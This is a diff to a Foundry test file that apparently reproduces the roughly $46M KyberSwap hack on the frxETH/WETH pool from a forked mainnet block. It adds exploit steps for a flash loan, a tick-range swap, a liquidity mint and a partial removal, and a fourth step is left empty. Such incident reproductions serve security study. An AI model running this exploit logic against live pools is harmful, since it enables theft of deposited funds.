@@ -4,6 +4,9 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
+import {IBasePositionManager as IKyberswapPositionManager} from "./KyberSwap/interfaces/periphery/IBasePositionManager.sol";
+import {IPool as IKyberswapPool} from "./KyberSwap/interfaces/IPool.sol";
+
 // @KeyInfo - Total Lost : ~$46M
 // Attacker EOA: https://etherscan.io/address/0x50275E0B7261559cE1644014d4b78D4AA63BE836
 // Attacker Contracts : https://etherscan.io/address/0xaf2acf3d4ab78e4c702256d214a3189a874cdc13
@@ -17,33 +20,13 @@ import "./interface.sol";
 // https://blog.solidityscan.com/kyberswap-hack-analysis-25e25f2e4a7b
 // https://slowmist.medium.com/a-deep-dive-into-the-kyberswap-hack-3e13f3305d3a
 
-// INTERFACES /////////////////////////////////////////////////////////////////
-
-interface IPoolStorage {
-    function token0() external view returns (IERC20);
-
-    function token1() external view returns (IERC20);
-
-    function swapFeeUnits() external view returns (uint24);
-
-    function tickDistance() external view returns (int24);
-
-    function getPositions(address owner, int24 tickLower, int24 tickUpper) external view returns (uint128 liquidity, uint256 feeGrowthInsideLast);
-
-    function getPoolState() external view returns (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick, bool locked);
-
-    function getLiquidityState() external view returns (uint128 baseL, uint128 reinvestL, uint128 reinvestLLast);
-}
-
-interface IPoolActions {
-    function swap(address recipient, int256 swapQty, bool isToken0, uint160 limitSqrtP, bytes memory data) external returns (int256 qty0, int256 qty1);
-}
-
-interface IKyberswapPool is IPoolActions, IPoolStorage {}
+// AAVE INTERFACES ////////////////////////////////////////////////////////////
 
 interface IAavePool {
     function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes memory params, uint16 referralCode) external;
 }
+
+// UNISWAP V3 INTERFACES //////////////////////////////////////////////////////
 
 interface IUniswapV3Pool {
     function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256 amount0, int256 amount1);
@@ -73,6 +56,7 @@ contract Exploiter is Test {
     address public _token0 = address(0);
     address public _token1 = address(0);
     uint256 public _amount = 0;
+    address public _manager = address(0xe222fBE074A436145b255442D919E4E3A6c6a480);
 
     constructor(address victim, address lender, uint256 amount) {
         _attacker = address(this);
@@ -95,22 +79,54 @@ contract Exploiter is Test {
         int256 __delta_0;
         int256 __delta_1;
 
-        // anti-snipping?
-        IERC20(_token0).approve(address(0xe222fBE074A436145b255442D919E4E3A6c6a480), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
-        IERC20(_token1).approve(address(0xe222fBE074A436145b255442D919E4E3A6c6a480), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+        int256 __tick_distance;
+        uint24 __fee;
 
-        // swap
+        uint160 __sqrtP;
+        int24 __currentTick;
+        int24 __nearestCurrentTick;
+
+        uint128 __baseL;
+        uint128 __reinvestL;
+        uint128 __reinvestLLast;
+
+        uint256 __token_id;
+
+        // anti-snipping?
+        IERC20(_token0).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+        IERC20(_token1).approve(_manager, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+
+        (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
+        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
+        emit log_named_uint("sqrtP", __sqrtP);
+        emit log_named_uint("baseL", uint256(__baseL));
+
+        // step 1: move to a tick range with 0 liquidity
         (__delta_0, __delta_1) = IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
         emit log_named_int("d0", __delta_0);
         emit log_named_int("d1", __delta_1);
 
-        // calculations
-        IKyberswapPool(_victim).tickDistance();
-        IKyberswapPool(_victim).swapFeeUnits();
-        IKyberswapPool(_victim).getPoolState();
-        IKyberswapPool(_victim).getLiquidityState();
+        __tick_distance = IKyberswapPool(_victim).tickDistance(); // 1
+        __fee = IKyberswapPool(_victim).swapFeeUnits(); // 10
+        
+        // step 2: supply liquidity
+        (__sqrtP, __currentTick, __nearestCurrentTick,) = IKyberswapPool(_victim).getPoolState();
+        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
+        emit log_named_uint("sqrtP", __sqrtP);
+        emit log_named_uint("baseL", uint256(__baseL));
+        (__token_id,,,) = IKyberswapPositionManager(_manager).mint(IKyberswapPositionManager.MintParams(_token0, _token1, __fee, __currentTick, 111310, [__nearestCurrentTick, __nearestCurrentTick], 6948087773336076, 107809615846697233, 0, 0, _attacker, 1700693711));
+        
+        // step 3: remove liquidity (14938549516730950591 = (1/6) * liquidity)
+        (__baseL, __reinvestL, __reinvestLLast) = IKyberswapPool(_victim).getLiquidityState();
+        IKyberswapPositionManager(_manager).removeLiquidity(IKyberswapPositionManager.RemoveLiquidityParams(__token_id, __baseL / 6, 0, 0, 1700693711));
 
-        // approve
+        // step 4
+
+        // balances
+        emit log_named_uint("l0", IERC20(_token0).balanceOf(_victim));
+        emit log_named_uint("l1", IERC20(_token1).balanceOf(_victim));
+
+        // repay the lender
         IERC20(_token1).approve(_lender, due);
 
         return true;
@@ -140,7 +156,7 @@ contract Exploiter is Test {
 
 // frxETH <=> WETH POOL EXPLOIT ///////////////////////////////////////////////
 
-contract KyberswapFrxEthWethPoolExploit is Exploiter, Logger {
+contract KyberswapFrxEthWethPoolExploitTest is Exploiter, Logger {
     string private constant _chain = "mainnet";
     uint256 private constant _block = 18_630_391;
 
@@ -156,7 +172,7 @@ contract KyberswapFrxEthWethPoolExploit is Exploiter, Logger {
     }
 
     function testExploit() public {
-        // create the exploit contract
+        // track changes
 
         // fund the attacker
         deal(_token1, _attacker, 200e18);
